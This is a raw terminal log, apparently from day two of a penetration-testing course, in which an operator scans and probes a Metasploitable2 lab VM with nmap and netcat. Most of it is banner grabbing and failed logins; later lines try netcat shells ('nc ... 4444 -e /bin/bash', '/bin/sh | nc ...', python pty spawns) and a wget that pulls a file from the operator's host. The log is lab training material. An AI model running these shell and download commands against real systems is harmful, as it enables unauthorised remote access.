+Connected to 192.168.58.129.
+220 ProFTPD 1.3.1 Server (Debian) [::ffff:192.168.58.129]
+Name (192.168.58.129:root): admin
+331 Password required for admin
+Password:
+530 Login incorrect.
+Login failed.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+ftp> ^C
+ftp> bye
+221 Goodbye.
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# namp[K[K[Kmap -p 81 -sV 192.168.1.[K68[K[K[K58.129[C 192.168.58.129- 192.168.58.129v 192.168.58.129
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 06:46 EST
+NSE: Loaded 45 scripts for scanning.
+Initiating ARP Ping Scan at 06:46
+Scanning 192.168.58.129 [1 port]
+Completed ARP Ping Scan at 06:46, 0.06s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 06:46
+Completed Parallel DNS resolution of 1 host. at 06:46, 0.01s elapsed
+Initiating SYN Stealth Scan at 06:46
+Scanning 192.168.58.129 [1 port]
+Discovered open port 81/tcp on 192.168.58.129
+Completed SYN Stealth Scan at 06:46, 0.05s elapsed (1 total ports)
+Initiating Service scan at 06:46
+Scanning 1 service on 192.168.58.129
+Completed Service scan at 06:46, 6.02s elapsed (1 service on 1 host)
+NSE: Script scanning 192.168.58.129.
+Initiating NSE at 06:46
+Completed NSE at 06:46, 0.03s elapsed
+Initiating NSE at 06:46
+Completed NSE at 06:46, 0.03s elapsed
+Nmap scan report for 192.168.58.129
+Host is up (0.00055s latency).
+
+PORT   STATE SERVICE VERSION
+81/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+MAC Address: 00:0C:29:E0:DB:E4 (VMware)
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.78 seconds
+           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nmap -p 81 -sV -v 192.168.58.129[1P[1P[1P[1P
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 06:46 EST
+Initiating ARP Ping Scan at 06:46
+Scanning 192.168.58.129 [1 port]
+Completed ARP Ping Scan at 06:46, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 06:46
+Completed Parallel DNS resolution of 1 host. at 06:46, 0.01s elapsed
+Initiating SYN Stealth Scan at 06:46
+Scanning 192.168.58.129 [1 port]
+Discovered open port 81/tcp on 192.168.58.129
+Completed SYN Stealth Scan at 06:46, 0.04s elapsed (1 total ports)
+Nmap scan report for 192.168.58.129
+Host is up (0.00054s latency).
+
+PORT   STATE SERVICE
+81/tcp open  hosts2-ns
+MAC Address: 00:0C:29:E0:DB:E4 (VMware)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
+           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc 192.168.1[K58.129 21
+220 (vsFTPd 2.3.4)
+
+whoami
+530 Please login with USER and PASS.
+admin
+530 Please login with USER and PASS.
+^C
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc 192.168.58.129 21
+220 (vsFTPd 2.3.4)
+^C
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc 192.168.58.129 21[1P181
+admin
+<html><head><title>Metasploitable2 - Linux</title></head><body>
+<pre>
+
+                _                  _       _ _        _     _      ____  
+ _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
+| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
+                            |_|                                          
+
+
+Warning: Never expose this VM to an untrusted network!
+
+Contact: msfdev[at]metasploit.com
+
+Login with msfadmin/msfadmin to get started
+
+
+</pre>
+<ul>
+<li><a href="/twiki/">TWiki</a></li>
+<li><a href="/phpMyAdmin/">phpMyAdmin</a></li>
+<li><a href="/mutillidae/">Mutillidae</a></li>
+<li><a href="/dvwa/">DVWA</a></li>
+<li><a href="/dav/">WebDAV</a></li>
+</ul>
+</body>
+</html>
+
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc 192.168.58.129 81[K[K21
+220 (vsFTPd 2.3.4)
+admin
+530 Please login with USER and PASS.
+^C
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc 192.168.58.129 2181
+msfdev   admin
+<html><head><title>Metasploitable2 - Linux</title></head><body>
+<pre>
+
+                _                  _       _ _        _     _      ____  
+ _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
+| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
+                            |_|                                          
+
+
+Warning: Never expose this VM to an untrusted network!
+
+Contact: msfdev[at]metasploit.com
+
+Login with msfadmin/msfadmin to get started
+
+
+</pre>
+<ul>
+<li><a href="/twiki/">TWiki</a></li>
+<li><a href="/phpMyAdmin/">phpMyAdmin</a></li>
+<li><a href="/mutillidae/">Mutillidae</a></li>
+<li><a href="/dvwa/">DVWA</a></li>
+<li><a href="/dav/">WebDAV</a></li>
+</ul>
+</body>
+</html>
+
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc 192.168.58.129 81[1P121[1P[1P[1@f[1@t[1@p
+Connected to 192.168.58.129.
+220 (vsFTPd 2.3.4)
+Name (192.168.58.129:root): msfadmin
+331 Please specify the password.
+Password:
+530 Login incorrect.
+Login failed.
+ftp> ls
+530 Please login with USER and PASS.
+ftp: bind: Address already in use
+ftp> 
+ftp> 
+ftp> ^C
+ftp> bye
+221 Goodbye.
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# ftp 192.168.58.129 21[1Pnc 192.168.58.129 812181218121
+220 (vsFTPd 2.3.4)
+^C
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc 192.168.58.129 21[K[K81
+
+
+
+sg
+<html><head><title>Metasploitable2 - Linux</title></head><body>
+<pre>
+
+                _                  _       _ _        _     _      ____  
+ _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
+| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
+                            |_|                                          
+
+
+Warning: Never expose this VM to an untrusted network!
+
+Contact: msfdev[at]metasploit.com
+
+Login with msfadmin/msfadmin to get started
+
+
+</pre>
+<ul>
+<li><a href="/twiki/">TWiki</a></li>
+<li><a href="/phpMyAdmin/">phpMyAdmin</a></li>
+<li><a href="/mutillidae/">Mutillidae</a></li>
+<li><a href="/dvwa/">DVWA</a></li>
+<li><a href="/dav/">WebDAV</a></li>
+</ul>
+</body>
+</html>
+
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc 192.168.58.129 81[C[C[1@ [1@-[1@v[1@v
+192.168.58.129: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.58.129] 81 (?) open
+
+aasf
+<html><head><title>Metasploitable2 - Linux</title></head><body>
+<pre>
+
+                _                  _       _ _        _     _      ____  
+ _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
+| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
+                            |_|                                          
+
+
+Warning: Never expose this VM to an untrusted network!
+
+Contact: msfdev[at]metasploit.com
+
+Login with msfadmin/msfadmin to get started
+
+
+</pre>
+<ul>
+<li><a href="/twiki/">TWiki</a></li>
+<li><a href="/phpMyAdmin/">phpMyAdmin</a></li>
+<li><a href="/mutillidae/">Mutillidae</a></li>
+<li><a href="/dvwa/">DVWA</a></li>
+<li><a href="/dav/">WebDAV</a></li>
+</ul>
+</body>
+</html>
+
+ sent 6, rcvd 891
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# echo "" | nc -vv -n -w1 192.168.58.129
+no port[s] to connect to
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# echo "" | nc -vv -n -w1 192.168.58.129 21
+(UNKNOWN) [192.168.58.129] 21 (ftp) open
+220 (vsFTPd 2.3.4)
+net timeout
+ sent 1, rcvd 20
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# echo "" | nc -vv -n -w1 192.168.58.129 21[K[K81
+(UNKNOWN) [192.168.58.129] 81 (?) open
+net timeout
+ sent 1, rcvd 0
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# echo "" | nc -vv -n -w1 192.168.58.129 8121[K[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[14Pnc -vv 192.168.58.129 81[4P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+http    GET http:^[[D           T/ http://1.1
+<html><head><title>Metasploitable2 - Linux</title></head><body>
+<pre>
+
+                _                  _       _ _        _     _      ____  
+ _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
+| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
+                            |_|                                          
+
+
+Warning: Never expose this VM to an untrusted network!
+
+Contact: msfdev[at]metasploit.com
+
+Login with msfadmin/msfadmin to get started
+
+
+</pre>
+<ul>
+<li><a href="/twiki/">TWiki</a></li>
+<li><a href="/phpMyAdmin/">phpMyAdmin</a></li>
+<li><a href="/mutillidae/">Mutillidae</a></li>
+<li><a href="/dvwa/">DVWA</a></li>
+<li><a href="/dav/">WebDAV</a></li>
+</ul>
+</body>
+</html>
+
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc 192.168.58.129 81
+GET/    /http://1.1. 
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /http://1.1 was not found on this server.</p>
+<hr>
+<address>Apache/2.2.8 (Ubuntu) DAV/2 Server at metasploitable.localdomain Port 80</address>
+</body></html>
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 192.168.58.2[K129[K[K[K[K[K[K[K[K[K[K[K[K[K[Knc 19[K92.168.58.129 4444
+(UNKNOWN) [192.168.58.129] 4444 (?) : Connection refused
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc 192.168.58.129 4444 -e /bin/bash
+(UNKNOWN) [192.168.58.129] 4444 (?) : Connection refused
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc 192.168.58.129 4444 -e /bin/bash[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Knc 192.168.58.129 4444 -e /bin/bash[C[C[K[K[K[K[K[K[K[K[K[K[K[K[K
+whoami
+
+
+
+id
+
+
+
+^C
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc 192.168.58.129 4444[C[1@ [1@-[1@v
+192.168.58.129: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.58.129] 4444 (?) : Connection refused
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -v 192.168.58.129 4444
+192.168.58.129: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.58.129] 4444 (?) : Connection refused
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -v 192.168.58.129 4444[3P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C -e /bin/bash
+id
+
+id
+^C
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc 192.168.58.129 4444 -e /bin/bash[10P-v 192.168.58.129 4444
+192.168.58.129: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+id
+python -c 'import pty; pty.spawn("/bin/sh")'
+id
+
+
+
+
+
+
+
+
+asd
+
+
+
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -v 192.168.58.129 4444
+192.168.58.129: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+id
+uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
+whoami
+msfadmin
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -v 192.168.58.129 4444[C[1@ [1@-[1@n[1@v[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C -e /bin/bash
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+id
+whoami
+^C
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -v -nv 192.168.58.129 4444 -e /bin/bash[1Psh[1Psh
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+id
+whoami
+asd
+
+
+
+^C
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# /bin/sh | nc 192.168.1[K58.129 4444[C[C[1@ [1@-[1@v
+192.168.58.129: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+id
+get   wget / 192.168.58.128:8000/file
+--2019-11-26 09:08:27--  http://192.168.58.128:8000/file
+Connessione a 192.168.58.128:8000...connesso.
+Richiesta HTTP inviata, in attesa di risposta... 200 OK
+Lunghezza: 0 [application/octet-stream]
+Salvataggio in: "file.1"
+
+file.1                        [<=>                                ]       0  --.-KB/s               file.1                        [ <=>                               ]       0  --.-KB/s    in 0s      
+
+2019-11-26 09:08:27 (0,00 B/s) - "file.1" salvato [0/0]
+
+ls
+^C
+
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# /bin/sh | nc -v 192.168.58.129 4444[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cnc -v -nv 192.168.58.129 4444 -e /bin/shbash[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[17P192.168.58.129 4444192.168.58.129 4444 -e /bin/bash[10P-v 192.168.58.129 4444
+192.168.58.129: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+wget / 192.168.             ls
+vulnerable
+wget 192.168.             
+
+
+wget 192.168.58.128:8000| \file
+ls
+vulnerable
+
+
+wget 192.168.58.128:8000/file
+
+ls
+file
+vulnerable
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -v 192.168.58.129 4444[1@/[1@b[1@i[C[1@n[1@/[1@b[1@a[1@s[1@h[1@ [1@|[1@ 
+192.168.58.129: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc --help
+nc: invalid option -- '-'
+nc -h for help
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc --help[K[K[K[K[Kh
+[v1.10-41.1]
+connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
+listen for inbound:	nc -l -p port [-options] [hostname] [port]
+options:
+	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
+	-e filename		program to exec after connect [dangerous!!]
+	-b			allow broadcasts
+	-g gateway		source-routing hop point[s], up to 8
+	-G num			source-routing pointer: 4, 8, 12, ...
+	-h			this cruft
+	-i secs			delay interval for lines sent, ports scanned
+        -k                      set keepalive option on socket
+	-l			listen mode, for inbound connects
+	-n			numeric-only IP addresses, no DNS
+	-o file			hex dump of traffic
+	-p port			local port number
+	-r			randomize local and remote ports
+	-q secs			quit after EOF on stdin and delay of secs
+	-s addr			local source address
+	-T tos			set Type Of Service
+	-t			answer TELNET negotiation
+	-u			UDP mode
+	-v			verbose [use twice to be more verbose]
+	-w secs			timeout for connects and final net reads
+	-C			Send CRLF as line-ending
+	-z			zero-I/O mode [used for scanning]
+port numbers can be individual or ranges: lo-hi [inclusive];
+hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -h-help[5Pexitrm file ll[Kwget 192.168.58.128:8000/file\fileifconfig[K[4Pexitifconfigwget 192.168.58.128:8000\file/filell[Krm file [4Pexitnc --helph[K[Knc -v 192.168.58.129 -c[Ke /bin/bash[C[1@ [1@4[1@4[1@4[1@4
+192.168.58.129: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+id
+whoami
+^C]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# /bin/bash | nc -v 192.168.58.129 4444[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[12P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[12@/bin/bash | [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[12P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C -e[Kc whoami
+192.168.58.129: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -v 192.168.58.129 4444 -c whoami[1@n
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -nv 192.168.58.129 4444 -c whoami[K[K[K[K[K[Kpython -c 'import pty; pty.spawn("/bin/sh")'
+(UNKNOWN) [192.168.58.129] 4444 (?) : Connection refused
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# clean[Kr
+[H[2J[3J]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# clearnc -nv 192.168.58.129 4444 -c python -c 'import pty; pty.spawn("/bin/sh")'
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+sh: 1: Syntax error: word unexpected (expecting ")")
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -nv 192.168.58.129 4444 -c python -c 'import pty; pty.spawn("/bin/sh")'"[C[1@"
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+  File "<string>", line 1
+    import pty; pty.spawn(/bin/sh)
+                          ^
+SyntaxError: invalid syntax
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -nv 192.168.58.129 4444 -c "python -c 'import pty; pty.spawn("/bin/sh")'"[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kls -la
+all-A-records NIY
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -nv 192.168.58.129 4444 -c ls -la[K[K[K[K[K[Kpwd
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -nv 192.168.58.129 4444 -c pwd[1P pwde pwd
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+exec pwd failed : No such file or directory
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -nv 192.168.58.129 4444 -e pwdc[C[C[C[Ce[C[C[C[Cc[C[C[C[C
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -nv 192.168.58.129 4444 -c pwde[C[C[C[Cc[C[C[C[Cls -la"python -c 'import pty; pty.spawn("/bin/sh")'"[2Ppython -c 'import pty; pty.spawn("/bin/sh")'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cclear[Knc -nv 192.168.58.129 4444 -c python -c 'import pty; pty.spawn("/bin/sh")'whoami[K[1P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/bin/bash | nc -v 192.168.58.129 4444
+192.168.58.129: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.58.129] 4444 (?) open
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# id
+
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -z -vv -n 127.0.0.1 1-30
+(UNKNOWN) [127.0.0.1] 30 (?) : Connection refused
+(UNKNOWN) [127.0.0.1] 29 (?) : Connection refused
+(UNKNOWN) [127.0.0.1] 28 (?) : Connection refused
+(UNKNOWN) [127.0.0.1] 27 (?) : Connection refused
+(UNKNOWN) [127.0.0.1] 26 (?) : Connection refused
+(UNKNOWN) [127.0.0.1] 25 (smtp) : Connection refused
+(UNKNOWN) [127.0.0.1] 24 (?) : Connection refused
+(UNKNOWN) [127.0.0.1] 23 (telnet) : Connection refused
+(UNKNOWN) [127.0.0.1] 22 (ssh) : Connection refused
+(UNKNOWN) [127.0.0.1] 21 (ftp) : Connection refused
+(UNKNOWN) [127.0.0.1] 20 (ftp-data) : Connection refused
+(UNKNOWN) [127.0.0.1] 19 (chargen) : Connection refused
+(UNKNOWN) [127.0.0.1] 18 (msp) : Connection refused
+(UNKNOWN) [127.0.0.1] 17 (qotd) : Connection refused
+(UNKNOWN) [127.0.0.1] 16 (?) : Connection refused
+(UNKNOWN) [127.0.0.1] 15 (netstat) : Connection refused
+(UNKNOWN) [127.0.0.1] 14 (?) : Connection refused
+(UNKNOWN) [127.0.0.1] 13 (daytime) : Connection refused
+(UNKNOWN) [127.0.0.1] 12 (?) : Connection refused
+(UNKNOWN) [127.0.0.1] 11 (systat) : Connection refused
+(UNKNOWN) [127.0.0.1] 10 (?) : Connection refused
+(UNKNOWN) [127.0.0.1] 9 (discard) : Connection refused
+(UNKNOWN) [127.0.0.1] 8 (?) : Connection refused
+(UNKNOWN) [127.0.0.1] 7 (echo) : Connection refused
+(UNKNOWN) [127.0.0.1] 6 (?) : Connection refused
+(UNKNOWN) [127.0.0.1] 5 (?) : Connection refused
